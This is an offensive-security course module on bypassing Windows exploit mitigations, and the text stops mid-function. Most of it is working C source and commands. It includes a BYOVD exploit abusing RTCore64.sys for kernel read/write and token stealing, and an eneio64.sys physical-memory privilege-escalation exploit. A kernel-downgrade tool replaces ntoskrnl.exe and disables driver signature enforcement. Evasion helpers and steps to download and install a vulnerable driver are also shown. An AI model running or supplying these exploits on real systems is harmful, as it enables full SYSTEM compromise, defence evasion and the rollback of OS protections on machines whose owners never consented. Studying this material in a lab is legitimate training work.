# Week 8: Mitigation Bypass

## Overview

_created by AnotherOne from @Pwn3rzs Telegram channel_.

> [!NOTE] Use the Appendix shared libraries; you’ll need them to compile everything else.

Week 7 taught you how to bypass Windows security boundaries (AMSI, WDAC, PPL, ETW).
You'll learn to bypass exploit mitigations (DEP, ASLR, CFG, CET) that prevent your exploit from succeeding once your code is running.
This is distinct from Week 7, which teaches you how to bypass OS security policies and features.

> **Week 7 vs Week 8 - The Key Distinction**:
>
> - **Week 7** answers: _"Can my code execute at all?"_ - bypass AMSI, WDAC, ASR, AppContainers, integrity levels, PPL, ETW telemetry
> - **Week 8** answers: _"Can my exploit succeed?"_ - bypass DEP, ASLR, stack cookies, CFG/XFG, heap safe-unlinking, CET shadow stacks

**This Week's Focus**:

- ASLR/KASLR bypass (prefetch side-channels, physical memory R/W)
- Control-flow hijacking on CET-enabled systems (JOP/COP)
- Windows heap exploitation defeating LFH randomization
- Linux cross-cache attacks with SLUBStick
- Windows CLFS/KTM and AFD.sys exploitation
- Data-only attacks and Win32k exploitation

**Prerequisites**:

- Completed Week 5: Basic exploitation techniques (stack overflow, ROP, heap)
- Completed Week 6: Understanding Modern Windows Mitigations
- Completed Week 7: Defeating Windows Security Boundaries
- Familiarity with WinDbg, GDB, x64dbg, and IDA/Ghidra
- C/C++, Python, and assembly knowledge
- Understanding of kernel debugging (KGDB/WinDbg kernel mode)

## Day 1: ASLR/KASLR Bypass & BYOVD (Bring Your Own Vulnerable Driver)

- **Goal**: Learn ASLR/KASLR bypass techniques plus BYOVD to establish arbitrary kernel R/W primitives.

- **Activities**:
  - _Reading_:
    - [Prefetch Side-Channel KASLR Bypass](https://github.com/exploits-forsale/prefetch-tool) - EntryBleed-style TLB cache timing
    - [Physical Memory Access via Vulnerable Drivers](https://www.loldrivers.io/) - LOLDrivers database
    - [Understanding BYOVD Attacks and Mitigation Strategies](https://www.halcyon.ai/blog/understanding-byovd-attacks-and-mitigation-strategies)
    - [BlackByte Ransomware Bypasses EDR Products via RTCore64.sys Abuse](https://www.picussecurity.com/resource/blog/blackbyte-ransomware-bypasses-edr-products-via-rtcore64.sys-abuse)
    - [Bypassing kASLR via Cache Timing](https://r0keb.github.io/posts/Bypassing-kASLR-via-Cache-Timing/)
    - [Format String Exploitation](https://owasp.org/www-community/attacks/Format_string_attack)
  - _Online Resources_:
    - [KASLR Bypass](https://www.youtube.com/watch?v=qhPLxz-i9tI)
  - _Lab Setup_:
    - Windows 11 24H2/25H2 VM with kernel debugging
    - Linux kernel 6.x VM with KGDB
    - WinDbg Preview / GDB with kernel symbols
    - Vulnerable drivers: RTCore64.sys, eneio64.sys, DBUtil_2_3.sys
    - OSR Driver Loader or similar tool
  - _Exercises_:
    1. Prefetch timing attack - Bypass Windows 11 24H2/25H2 KASLR
    2. BYOVD: Load and exploit RTCore64.sys for arbitrary kernel R/W
    3. eneio64.sys physical memory R/W for kernel object retrieval
    4. DBUtil_2_3.sys exploitation for KASLR bypass
    5. Format string vulnerability to leak stack/heap addresses
    6. Heap over-read to leak module bases
    7. Building 2-stage exploits (leak -> exploit)
    8. BYOVD detection evasion techniques

### Deliverables

- [ ] Implement prefetch side-channel KASLR bypass (Intel CPUs)
- [ ] Build BYOVD loader and exploit RTCore64.sys for arbitrary kernel R/W
- [ ] Exploit eneio64.sys for physical memory R/W
- [ ] Demonstrate KASLR bypass via vulnerable driver
- [ ] Build format string exploit for usermode ASLR bypass
- [ ] Create 2-stage exploit template (information leak + exploitation)

### BYOVD (Bring Your Own Vulnerable Driver)

BYOVD exploits legitimate signed drivers with known vulnerabilities to gain arbitrary kernel read/write primitives. Attackers load drivers like RTCore64.sys (MSI Afterburner) or eneio64.sys (G.SKILL) that expose dangerous IOCTLs for memory access. Because these drivers are legitimately signed by vendors, they bypass DSE and HVCI. The technique chains kernel R/W primitives with KASLR bypass (via NtQuerySystemInformation leaks) to locate and steal the SYSTEM process token.

**Key BYOVD Drivers:**

- **RTCore64.sys** - Arbitrary kernel R/W via IOCTLs `0x80002048`/`0x8000204C`
- **eneio64.sys** - Physical memory R/W

```c
// rtcore64_byovd.c
// Compile: rc /fo res\version.res res\version.rc
//          cl src\rtcore64_byovd.c res\version.res /Fe:bin\rtcore_exploit.exe ntdll.lib advapi32.lib ole32.lib user32.lib /O2 /GS- /I.\headers
// Run: .\bin\rtcore_exploit.exe

#define SYSCALLS_IMPLEMENTATION

#include <windows.h>
#include <stdio.h>
#include <psapi.h>
#include <time.h>

#pragma comment(lib, "psapi.lib")

#include "exploit_common.h"
#include "evasion.h"
#include "bypass.h"
#include "syscalls.h"
#include "driver_info.h"
#include "kernel_utils.h"
#include "exploit_utils.h"

#define TARGET_DRIVER    "RTCore64"
#define MAX_RETRY_ATTEMPTS 3

static HANDLE g_hDevice = NULL;
static KERNEL_OFFSETS g_Offsets = {0};
static DWORD64 g_OriginalToken = 0;

// Kernel R/W via RTCore64 + indirect syscall, falling back to direct DeviceIoControl
BOOL KernelRead32(DWORD64 address, PDWORD outValue) {
    if (!g_hDevice || g_hDevice == INVALID_HANDLE_VALUE) return FALSE;
    if ((address & 0xFFFF000000000000ULL) != 0xFFFF000000000000ULL) return FALSE;

    RTCORE64_MEMORY mem;
    memset(&mem, 0, sizeof(mem));
    mem.Address = address;
    mem.Offset  = 0;
    mem.Size    = 4;

    IO_STATUS_BLOCK ioStatus = {0};
    NTSTATUS status;
    if (g_Syscall_NtDeviceIoControlFile.resolved) {
        status = ExecuteIndirectSyscall(&g_Syscall_NtDeviceIoControlFile,
            g_hDevice, NULL, NULL, NULL, &ioStatus,
            (PVOID)(ULONG_PTR)RTCORE_IOCTL_READ, &mem, (PVOID)sizeof(mem), &mem, (PVOID)sizeof(mem));
    } else {
        status = g_fnNtDeviceIoControlFile(
            g_hDevice, NULL, NULL, NULL, &ioStatus,
            RTCORE_IOCTL_READ, &mem, sizeof(mem), &mem, sizeof(mem));
    }

    if (NT_SUCCESS(status)) { *outValue = mem.Value; return TRUE; }
    return FALSE;
}

BOOL KernelWrite32(DWORD64 address, DWORD value) {
    if (!g_hDevice || g_hDevice == INVALID_HANDLE_VALUE) return FALSE;
    if ((address & 0xFFFF000000000000ULL) != 0xFFFF000000000000ULL) return FALSE;

    RTCORE64_MEMORY mem = {0};
    mem.Address = address;
    mem.Offset  = 0;
    mem.Size    = 4;
    mem.Value   = value;

    IO_STATUS_BLOCK ioStatus = {0};
    NTSTATUS status;
    if (g_Syscall_NtDeviceIoControlFile.resolved) {
        status = ExecuteIndirectSyscall(&g_Syscall_NtDeviceIoControlFile,
            g_hDevice, NULL, NULL, NULL, &ioStatus,
            (PVOID)(ULONG_PTR)RTCORE_IOCTL_WRITE, &mem, (PVOID)sizeof(mem), &mem, (PVOID)sizeof(mem));
    } else {
        status = g_fnNtDeviceIoControlFile(
            g_hDevice, NULL, NULL, NULL, &ioStatus,
            RTCORE_IOCTL_WRITE, &mem, sizeof(mem), &mem, sizeof(mem));
    }

    return NT_SUCCESS(status);
}

BOOL KernelRead64(DWORD64 address, PDWORD64 outValue) {
    if (address == 0 || address == (DWORD64)-1) return FALSE;
    if (address > 0xFFFFFFFFFFFFFFFBULL) return FALSE;
    DWORD low = 0, high = 0;
    if (!KernelRead32(address, &low)) return FALSE;
    if (!KernelRead32(address + 4, &high)) return FALSE;
    *outValue = ((DWORD64)high << 32) | low;
    return TRUE;
}

BOOL KernelWrite64(DWORD64 address, DWORD64 value) {
    if (!KernelWrite32(address,     (DWORD)(value & 0xFFFFFFFF))) return FALSE;
    if (!KernelWrite32(address + 4, (DWORD)(value >> 32)))        return FALSE;
    return TRUE;
}

static BOOL OpenDriverWithFallbacks(HANDLE* p_hDevice, DRIVER_ENTRY** p_driver) {
    DRIVER_ENTRY* target_driver = *p_driver;
    int attempts = 0;

    while (attempts < MAX_RETRY_ATTEMPTS) {
        if (OpenDriverDevice(target_driver, p_hDevice)) {
            g_hDevice = *p_hDevice;
            wprintf(L"[+] Driver: %s\n", target_driver->name);
            return TRUE;
        }

        if (attempts == 0) {
            if (TryDriverFallbacks(p_driver, p_hDevice)) {
                target_driver = *p_driver;
                g_hDevice     = *p_hDevice;
                wprintf(L"[+] Driver: %s (fallback)\n", target_driver->name);
                return TRUE;
            }
        }

        attempts++;
        SleepJitter(1000);
    }

    return FALSE;
}

int main(int argc, char* argv[]) {

    if (!ExploitInitialize(TRUE)) return 1;
    srand((unsigned int)time(NULL));

    printf("[*] Starting evasion and anti-analysis...\n"); fflush(stdout);

    SleepJitter(100);

    printf("[*] Resolving syscalls and APIs...\n"); fflush(stdout);


    printf("[*] Looking for driver %S...\n", L"" TARGET_DRIVER); fflush(stdout);
    DRIVER_ENTRY* target_driver = FindDriverByName(L"" TARGET_DRIVER);
    if (!target_driver) {
        printf("[-] Driver not found\n"); fflush(stdout);
        return 1;
    }

    HANDLE hDevice;
    if (!OpenDriverWithFallbacks(&hDevice, &target_driver)) {
        printf("[-] Failed to open driver\n");
        return 1;
    }

        DWORD64 kBase = 0;
    ExploitSetupKernel(&g_Offsets, &kBase, TRUE);
    if (!kBase) {
        printf("[-] Failed to leak kernel base\n"); fflush(stdout);
        CloseHandle(hDevice);
        return 1;
    }

    printf("[+] Kernel Base:                  0x%llx\n", kBase); fflush(stdout);

    if (!TestKernelReadWrite(kBase, hDevice, FALSE)) {
        printf("[-] Kernel R/W test failed\n");
        CloseHandle(hDevice);
        return 1;
    }

    printf("[+] Kernel R/W:                   Working\n\n");

    int technique = TECHNIQUE_TOKEN_STEALING;
    if (argc > 1) {
        technique = atoi(argv[1]);
        if (technique < 1 || technique > 3) {
            printf("[-] Invalid technique selected. Use:\n");
            printf("    1: Token Stealing\n");
            printf("    2: ACL Editing\n");
            printf("    3: Privilege Manipulation\n");
            CloseHandle(hDevice);
            return 1;
        }
    }

    printf("[*] Using Technique %d: %s\n", technique,
        technique == 1 ? "Token Stealing" :
        technique == 2 ? "ACL Editing" : "Privilege Manipulation");

    SleepJitter(500);

    if (!ApplyLPE(kBase, &g_Offsets, (LPE_TECHNIQUE)technique, &g_OriginalToken)) {
        printf("[-] Privilege escalation failed\n");
        CloseHandle(hDevice);
        return 1;
    }

    printf("[*] Verifying identity and privileges:\n");
    system("whoami");
    system("whoami /priv");
    fflush(stdout);
    printf("\n");

    SleepJitter(500);

    CloseHandle(hDevice);
    return 0;
}
```

**Compile & Run:**

```bash
cd c:\Windows_Mitigations_Lab
rc /fo res\version.res res\version.rc
cl src\rtcore64_byovd.c res\version.res /Fe:bin\rtcore_exploit.exe ntdll.lib advapi32.lib ole32.lib user32.lib /O2 /GS- /I.\headers
# run as admin
sc.exe start RTCore64
# run in non-admin(can work in admin too, but you want to see the LPE)
.\bin\rtcore_exploit.exe 1
.\bin\rtcore_exploit.exe 2
.\bin\rtcore_exploit.exe 3
```

### Physical Memory R/W via Vulnerable Drivers

Advanced BYOVD variant that maps entire physical memory into usermode for direct manipulation. Drivers like eneio64.sys (CVE-2020-12446) expose IOCTLs that map physical address ranges into the caller's virtual address space. The exploit scans physical RAM for ntoskrnl.exe's PE header (MZ signature) to locate the kernel, then performs page table walks to find CR3 and establish virtual-to-physical translation. With V2P mapping, the attacker locates EPROCESS structures via pool tag scanning ('Proc') or SystemBigPoolInformation queries, walks the process list via ActiveProcessLinks, and overwrites the current process token with SYSTEM's token—all through physical memory writes.

```c
// eneio64_exploit.c
// Compile: cl src\eneio64_exploit.c /Fe:bin\eneio64_exploit.exe ntdll.lib advapi32.lib psapi.lib /I.\headers
// Run: bin\eneio64_exploit.exe

#define SYSCALLS_IMPLEMENTATION

#include <windows.h>
#include <stdio.h>
#include <psapi.h>
#include <time.h>

#pragma comment(lib, "psapi.lib")

#include "exploit_common.h"
#include "evasion.h"
#include "bypass.h"
#include "syscalls.h"
#include "kernel_utils.h"
#include "exploit_utils.h"

// IOCTL codes for eneio64.sys
#define IOCTL_ENEIO_MAP_PHYSICAL    0x80102040
#define IOCTL_ENEIO_UNMAP_PHYSICAL  0x80102044
#define IOCTL_ENEIO_READ_PHYSICAL   0x80102050
#define IOCTL_ENEIO_WRITE_PHYSICAL  0x80102054

#define MAX_KERNEL_SCAN_SIZE  0x200000000ULL

#pragma pack(push, 1)
typedef struct _PHYSICAL_MEMORY_INFO {
    DWORD64 Size;
    DWORD64 val2;
    DWORD64 val3;
    DWORD64 MappedVirtualAddr;
    DWORD64 val5;
} PHYSICAL_MEMORY_INFO;
#pragma pack(pop)

typedef struct _EXPLOIT_CONTEXT {
    HANDLE  hDevice;
    PVOID   mappedMemory;
    DWORD64 mappedSize;
    DWORD64 kernelVirtualBase;
    DWORD64 kernelPhysicalBase;
    DWORD64 cr3;
    KERNEL_OFFSETS offsets;BOOL cleanupRequired;
} EXPLOIT_CONTEXT;

static EXPLOIT_CONTEXT g_ctx = {0};

// Cleanup function for proper resource management
static void CleanupExploitContext(EXPLOIT_CONTEXT* ctx) {
    if (!ctx->cleanupRequired) return;
    if (ctx->mappedMemory && ctx->hDevice != INVALID_HANDLE_VALUE) {
        PHYSICAL_MEMORY_INFO info = {0};
        DWORD bytesReturned;

        SleepJitter(100);

        DeviceIoControl(ctx->hDevice, IOCTL_ENEIO_UNMAP_PHYSICAL,
                       &info, sizeof(info), &info, sizeof(info),
                       &bytesReturned, NULL);
        ctx->mappedMemory = NULL;
    }

    if (ctx->hDevice != INVALID_HANDLE_VALUE) {
        CloseHandle(ctx->hDevice);
        ctx->hDevice = INVALID_HANDLE_VALUE;
    }

    SecureZeroMemory64(&ctx->cr3, sizeof(DWORD64));
    SecureZeroMemory64(&ctx->kernelPhysicalBase, sizeof(DWORD64));

    ctx->cleanupRequired = FALSE;
}

static HANDLE OpenEneioDevice() {
    const char* deviceNames[] = {
        "\\\\.\\GLCKIo",
        "\\\\.\\GLCKIO",
        "\\\\.\\glckio"
    };

    for (int i = 0; i < 3; i++) {
        if (i > 0) SleepJitter(100);

        HANDLE hDevice = CreateFileA(deviceNames[i], GENERIC_READ | GENERIC_WRITE,
                                     0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hDevice != INVALID_HANDLE_VALUE) {
            printf("[+] Device opened: %s\n", deviceNames[i]);
            return hDevice;
        }
    }

    return INVALID_HANDLE_VALUE;
}

static PVOID MapPhysicalMemory(HANDLE hDevice, DWORD64 size) {
    PHYSICAL_MEMORY_INFO info;
    DWORD bytesReturned;

    SecureZeroMemory64(&info, sizeof(info));
    info.Size = size;

    SleepJitter(200);

    if (!DeviceIoControl(hDevice, IOCTL_ENEIO_MAP_PHYSICAL,
                         &info, sizeof(info), &info, sizeof(info),
                         &bytesReturned, NULL)) {
        return NULL;
    }

    return (PVOID)info.MappedVirtualAddr;
}

BOOL KernelRead32(DWORD64 address, PDWORD outValue) {
    if (!g_ctx.mappedMemory || !g_ctx.cr3) return FALSE;
    DWORD64 phys = VirtualToPhysical(g_ctx.cr3, address, (BYTE*)g_ctx.mappedMemory, g_ctx.mappedSize);
    if (!phys) return FALSE;
    *outValue = *(DWORD*)((BYTE*)g_ctx.mappedMemory + phys);
    return TRUE;
}

BOOL KernelRead64(DWORD64 address, PDWORD64 outValue) {
    if (!g_ctx.mappedMemory || !g_ctx.cr3) return FALSE;
    DWORD64 phys = VirtualToPhysical(g_ctx.cr3, address, (BYTE*)g_ctx.mappedMemory, g_ctx.mappedSize);
    if (!phys) return FALSE;
    *outValue = *(DWORD64*)((BYTE*)g_ctx.mappedMemory + phys);
    return TRUE;
}

BOOL KernelWrite32(DWORD64 address, DWORD value) {
    if (!g_ctx.mappedMemory || !g_ctx.cr3) return FALSE;
    DWORD64 phys = VirtualToPhysical(g_ctx.cr3, address, (BYTE*)g_ctx.mappedMemory, g_ctx.mappedSize);
    if (!phys) return FALSE;
    *(DWORD*)((BYTE*)g_ctx.mappedMemory + phys) = value;
    return TRUE;
}

BOOL KernelWrite64(DWORD64 address, DWORD64 value) {
    if (!g_ctx.mappedMemory || !g_ctx.cr3) return FALSE;
    DWORD64 phys = VirtualToPhysical(g_ctx.cr3, address, (BYTE*)g_ctx.mappedMemory, g_ctx.mappedSize);
    if (!phys) return FALSE;
    *(DWORD64*)((BYTE*)g_ctx.mappedMemory + phys) = value;
    return TRUE;
}

int main(int argc, char* argv[]) {

    if (!ExploitInitialize(TRUE)) return 1;
    srand((unsigned int)time(NULL));

    SecureZeroMemory64(&g_ctx, sizeof(EXPLOIT_CONTEXT));
    g_ctx.hDevice = INVALID_HANDLE_VALUE;

    printf("=== eneio64.sys BYOVD Exploit ===\n\n");

    SleepJitter(500);




        g_ctx.hDevice = OpenEneioDevice();
    if (g_ctx.hDevice == INVALID_HANDLE_VALUE) {
        printf("[-] Cannot open eneio device\n");
        return 1;
    }
    g_ctx.cleanupRequired = TRUE;

    MEMORYSTATUSEX memStatus;
    memStatus.dwLength = sizeof(memStatus);
    if (!GlobalMemoryStatusEx(&memStatus)) {
        CleanupExploitContext(&g_ctx);
        return 1;
    }

    g_ctx.mappedMemory = MapPhysicalMemory(g_ctx.hDevice, memStatus.ullTotalPhys);
    if (!g_ctx.mappedMemory) {
        printf("[-] Failed to map physical memory\n");
        CleanupExploitContext(&g_ctx);
        return 1;
    }
    g_ctx.mappedSize = memStatus.ullTotalPhys;
    printf("[+] Physical memory mapped: 0x%llx bytes\n", g_ctx.mappedSize);

    g_ctx.kernelVirtualBase = SelectKASLRBypassMethod(g_fnNtQuerySystemInformation,
                                                       g_fnRtlGetVersion,
                                                       FALSE, FALSE,
                                                       &g_Syscall_NtQuerySystemInformation);

    g_ctx.kernelPhysicalBase = ScanPhysicalMemoryForKernel((BYTE*)g_ctx.mappedMemory, g_ctx.mappedSize, MAX_KERNEL_SCAN_SIZE);
    if (!g_ctx.kernelPhysicalBase) {
        printf("[-] Kernel base not found\n");
        CleanupExploitContext(&g_ctx);
        return 1;
    }
    printf("[+] Found ntoskrnl.exe at physical 0x%llx\n", g_ctx.kernelPhysicalBase);

    DWORD64 ntosBase = GetNtoskrnlBase();
    if (!ntosBase) ntosBase = g_ctx.kernelVirtualBase;

    if (!ntosBase) {
        printf("[*] Non-admin detected, deducing virtual base from physical...\n");
        ntosBase = DeduceVirtualBaseFromPhysical((BYTE*)g_ctx.mappedMemory,
                                                  g_ctx.kernelPhysicalBase, g_ctx.mappedSize);
        if (!ntosBase) {
            printf("[-] Failed to deduce kernel virtual base\n");
            CleanupExploitContext(&g_ctx);
            return 1;
        }
        g_ctx.kernelVirtualBase = ntosBase;
    }

    g_ctx.cr3 = FindCR3ViaPageWalk((BYTE*)g_ctx.mappedMemory, ntosBase, g_ctx.kernelPhysicalBase, g_ctx.mappedSize);
    if (!g_ctx.cr3) {
        printf("[-] Failed to find CR3\n");
        CleanupExploitContext(&g_ctx);
        return 1;
    }

    DWORD64 testPhys = VirtualToPhysical(g_ctx.cr3, g_ctx.kernelVirtualBase,
                                         (BYTE*)g_ctx.mappedMemory, g_ctx.mappedSize);
    if (testPhys == g_ctx.kernelPhysicalBase) {
        printf("[+] V2P translation verified\n");
    }

    DWORD64 systemEPROCESS = FindPsInitialSystemProcess(g_ctx.kernelVirtualBase);
    if (systemEPROCESS) {
        printf("[*] Resolving offsets dynamically via System EPROCESS at 0x%llx...\n", systemEPROCESS);
        if (VerifyEPROCESSOffsets(systemEPROCESS, &g_ctx.offsets)) {
            printf("[+] Offsets resolved successfully\n");
        } else {
            printf("[!] Offset resolution failed - falling back to defaults\n");
        }
    }

    int technique = TECHNIQUE_TOKEN_STEALING;
    if (argc > 1) {
        technique = atoi(argv[1]);
        if (technique < 1 || technique > 3) {
            printf("[-] Invalid technique. Using default (1)\n");
            technique = 1;
        }
    }

    printf("[*] Using Technique %d: %s\n", technique,
           technique == 1 ? "Token Stealing" :
           technique == 2 ? "ACL Editing" : "Privilege Manipulation");

    SleepJitter(300);

    DWORD64 originalToken = 0;
    if (ApplyLPEPhysical((BYTE*)g_ctx.mappedMemory, g_ctx.cr3, g_ctx.mappedSize, &g_ctx.offsets,
                          g_fnNtQuerySystemInformation, (LPE_TECHNIQUE)technique, &originalToken)) {
        printf("\n[+] Exploit successful!\n");
        system("whoami");
        system("whoami /priv");
    } else {
        printf("[-] Privilege escalation failed\n");
    }

    CleanupExploitContext(&g_ctx);
    return 0;
}
```

**Compile & Run:**

```bash
cl src\eneio64_exploit.c /Fe:bin\eneio64_exploit.exe ntdll.lib advapi32.lib psapi.lib /I.\headers
# run as admin
cd C:\Windows_Mitigations_Lab\drivers\
Invoke-WebRequest -Uri "https://github.com/magicsword-io/LOLDrivers/raw/main/drivers/66066d9852bc65988fb4777f0ff3fbb4.bin" -Outfile "eneio64.sys"
Copy-Item "C:\Windows_Mitigations_Lab\drivers\eneio64.sys" -Destination "C:\Windows\System32\drivers\eneio64.sys"
sc.exe create eneio64 type=kernel binPath="C:\Windows\System32\drivers\eneio64.sys"
sc.exe start eneio64
# run as non-admin(can be run via admin as well)
cd C:\Windows_Mitigations_Lab\
.\bin\eneio64_exploit.exe 1
.\bin\eneio64_exploit.exe 2
.\bin\eneio64_exploit.exe 3
```

### Windows Downgrade Attacks

Exploits Windows Update's insufficient version validation to replace patched system components with vulnerable versions. Demonstrated at Black Hat USA 2024 by Alon Leviev (SafeBreach), the attack stops Windows Update service, takes ownership of ntoskrnl.exe via takeown/icacls, replaces it with an older vulnerable build, and modifies BCD to disable DSE (nointegritychecks, testsigning). The downgrade bypasses Secure Boot by targeting bootmgfw.efi on the ESP partition. This effectively undoes years of security patches, enabling unsigned driver loading and known kernel exploits. The downgrade persists across reboots and is invisible to Windows Update.

**Attack Surface:**

- Windows Update servicing stack (`wuaueng.dll`, `TrustedInstaller`)
- Component-Based Servicing (CBS) manifests
- Windows Imaging Format (WIM) delta compression
- Boot Configuration Data (BCD) store
- Secure Boot policy enforcement

**Key Vulnerabilities:**

- Insufficient version validation during component replacement
- Missing integrity checks on downgrade operations
- Weak rollback protection for critical components
- Bypassable Secure Boot revocation lists

Implement Windows Update hijacking to downgrade `ntoskrnl.exe` to a vulnerable version, bypassing Driver Signature Enforcement (DSE) and enabling unsigned driver loading.

```c
// windows_downgrade.c
// Compile: cl src\windows_downgrade.c /Fe:bin\downgrade.exe advapi32.lib ntdll.lib /O2 /I.\headers
// Run: .\downgrade.exe <path_to_vulnerable_ntoskrnl.exe> (requires Administrator + SYSTEM privileges)

#define SYSCALLS_IMPLEMENTATION

#include <windows.h>
#include <stdio.h>
#include <time.h>

#include "exploit_common.h"
#include "evasion.h"
#include "bypass.h"
#include "syscalls.h"
#include "exploit_utils.h"

#define BACKUP_DIR "C:\\Temp"
#define BACKUP_PATH "C:\\Temp\\ntoskrnl.exe.backup"
#define SYSTEM32_KERNEL "C:\\Windows\\System32\\ntoskrnl.exe"
#define SYSTEM32_KERNEL_ORIGINAL "C:\\Windows\\System32\\ntoskrnl.exe.original"

typedef struct _DOWNGRADE_CONTEXT {
    char vulnerableKernelPath[MAX_PATH];
    BOOL backupCreated;
    BOOL kernelReplaced;
    BOOL bcdModified;
} DOWNGRADE_CONTEXT;

static DOWNGRADE_CONTEXT g_ctx = {0};

static BOOL StopWindowsUpdateService() {
    printf("[*] Stopping Windows Update service...\n");

    SC_HANDLE hSCM = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!hSCM) {
        printf("[-] Failed to open SCM: %lu\n", GetLastError());
        return FALSE;
    }

    SC_HANDLE hService = OpenServiceA(hSCM, "wuauserv", SERVICE_STOP | SERVICE_QUERY_STATUS);
    if (hService) {
        SERVICE_STATUS status;
        if (ControlService(hService, SERVICE_CONTROL_STOP, &status)) {
            printf("[+] Windows Update service stopped\n");
        } else {
            printf("[!] Service may already be stopped\n");
        }
        CloseServiceHandle(hService);
    } else {
        printf("[-] Failed to open Windows Update service\n");
    }

    CloseServiceHandle(hSCM);
    return TRUE;
}

typedef BOOL (WINAPI *pWow64DisableWow64FsRedirection_t)(PVOID*);
typedef BOOL (WINAPI *pWow64RevertWow64FsRedirection_t)(PVOID);

static pWow64DisableWow64FsRedirection_t fnWow64DisableWow64FsRedirection = NULL;
static pWow64RevertWow64FsRedirection_t fnWow64RevertWow64FsRedirection = NULL;

static BOOL InitializeWow64APIs() {
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (!hKernel32) return FALSE;

    fnWow64DisableWow64FsRedirection = (pWow64DisableWow64FsRedirection_t)
        ResolveAPI(hKernel32, HashAPI("Wow64DisableWow64FsRedirection"));
    fnWow64RevertWow64FsRedirection = (pWow64RevertWow64FsRedirection_t)
        ResolveAPI(hKernel32, HashAPI("Wow64RevertWow64FsRedirection"));

    return (fnWow64DisableWow64FsRedirection && fnWow64RevertWow64FsRedirection);
}

static BOOL BackupOriginalKernel() {
    printf("[*] Backing up current ntoskrnl.exe...\n");

    CreateDirectoryA(BACKUP_DIR, NULL);

    PVOID oldValue = NULL;
    if (fnWow64DisableWow64FsRedirection) {
        fnWow64DisableWow64FsRedirection(&oldValue);
    }

    BOOL result = CopyFileA(SYSTEM32_KERNEL, BACKUP_PATH, FALSE);

    if (fnWow64RevertWow64FsRedirection) {
        fnWow64RevertWow64FsRedirection(oldValue);
    }

    if (result) {
        printf("[+] Backup created: %s\n", BACKUP_PATH);
        g_ctx.backupCreated = TRUE;
    } else {
        printf("[-] Backup failed: %lu\n", GetLastError());
    }

    return result;
}

static BOOL TakeOwnershipOfKernel() {
    printf("[*] Taking ownership of ntoskrnl.exe...\n");

    SleepJitter(200);

    char cmd[512];
    sprintf(cmd, "takeown /F %s >nul 2>&1", SYSTEM32_KERNEL);
    system(cmd);

    sprintf(cmd, "icacls %s /grant Administrators:F >nul 2>&1", SYSTEM32_KERNEL);
    system(cmd);

    printf("[+] Ownership and permissions modified\n");
    return TRUE;
}

static BOOL DowngradeKernelComponent() {
    printf("[*] Initiating kernel downgrade...\n");
    printf("[!] WARNING: This will replace ntoskrnl.exe with vulnerable version\n");
    printf("[!] System will be vulnerable after reboot\n");

    SleepJitter(500);

    if (!StopWindowsUpdateService()) {
        printf("[-] Failed to stop Windows Update\n");
    }

    PVOID oldValue = NULL;
    if (fnWow64DisableWow64FsRedirection) {
        fnWow64DisableWow64FsRedirection(&oldValue);
    }

    if (!TakeOwnershipOfKernel()) {
        if (fnWow64RevertWow64FsRedirection) {
            fnWow64RevertWow64FsRedirection(oldValue);
        }
        return FALSE;
    }

    printf("[*] Replacing ntoskrnl.exe with vulnerable version...\n");
    SleepJitter(300);

    if (!MoveFileExA(SYSTEM32_KERNEL, SYSTEM32_KERNEL_ORIGINAL, MOVEFILE_REPLACE_EXISTING)) {
        printf("[-] Failed to rename original: %lu\n", GetLastError());
        if (fnWow64RevertWow64FsRedirection) {
            fnWow64RevertWow64FsRedirection(oldValue);
        }
        return FALSE;
    }

    if (!CopyFileA(g_ctx.vulnerableKernelPath, SYSTEM32_KERNEL, FALSE)) {
        printf("[-] Failed to copy vulnerable kernel: %lu\n", GetLastError());

        MoveFileA(SYSTEM32_KERNEL_ORIGINAL, SYSTEM32_KERNEL);

        if (fnWow64RevertWow64FsRedirection) {
            fnWow64RevertWow64FsRedirection(oldValue);
        }
        return FALSE;
    }

    if (fnWow64RevertWow64FsRedirection) {
        fnWow64RevertWow64FsRedirection(oldValue);
    }

    g_ctx.kernelReplaced = TRUE;

    printf("[+] Kernel downgrade complete!\n");
    printf("[+] Vulnerable ntoskrnl.exe installed\n");

    return TRUE;
}

static BOOL ModifyBootConfiguration() {
    printf("[*] Modifying Boot Configuration Data (BCD)...\n");

    SleepJitter(300);
    system("bcdedit /set nointegritychecks on >nul 2>&1");
    system("bcdedit /set testsigning on >nul 2>&1");

    g_ctx.bcdModified = TRUE;

    printf("[+] DSE disabled in BCD\n");
    printf("[+] Test signing enabled\n");

    return TRUE;
}

static void DisplaySecureBootBypassInfo() {
    printf("\n[*] Secure Boot Bypass Information:\n");
    printf("[*] Technique: Downgrade bootmgfw.efi to vulnerable version\n");
    printf("[!] This step requires:\n");
    printf("    1. Mount EFI System Partition\n");
    printf("    2. Replace bootmgfw.efi with vulnerable version\n");
    printf("    3. Modify Secure Boot policy to allow old bootloader\n");
    printf("[*] Skipping in this implementation (requires ESP access)\n");
}

static BOOL ValidateVulnerableKernel(const char* path) {
    HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Vulnerable kernel not found: %s\n", path);
        return FALSE;
    }

    BYTE buffer[0x1000];
    DWORD bytesRead;
    if (!ReadFile(hFile, buffer, sizeof(buffer), &bytesRead, NULL) || bytesRead < 0x1000) {
        CloseHandle(hFile);
        return FALSE;
    }

    CloseHandle(hFile);

    if (*(WORD*)buffer != 0x5A4D) {
        printf("[-] Invalid PE file (missing MZ header)\n");
        return FALSE;
    }

    DWORD e_lfanew = *(DWORD*)(buffer + 0x3C);
    if (e_lfanew >= 0x1000) {
        printf("[-] Invalid PE file (bad e_lfanew)\n");
        return FALSE;
    }

    if (*(DWORD*)(buffer + e_lfanew) != 0x00004550) {
        printf("[-] Invalid PE file (missing PE signature)\n");
        return FALSE;
    }

    printf("[+] Vulnerable kernel validated: %s\n", path);
    return TRUE;
}

static void DisplayRestorationInstructions() {
    printf("\n[!] To restore system:\n");
    printf("    1. Boot into Safe Mode\n");

    if (g_ctx.backupCreated) {
        printf("    2. Copy %s to %s\n", BACKUP_PATH, SYSTEM32_KERNEL);
    } else {
        printf("    2. Rename %s to %s\n", SYSTEM32_KERNEL_ORIGINAL, SYSTEM32_KERNEL);
    }

    if (g_ctx.bcdModified) {
        printf("    3. Run: bcdedit /set nointegritychecks off\n");
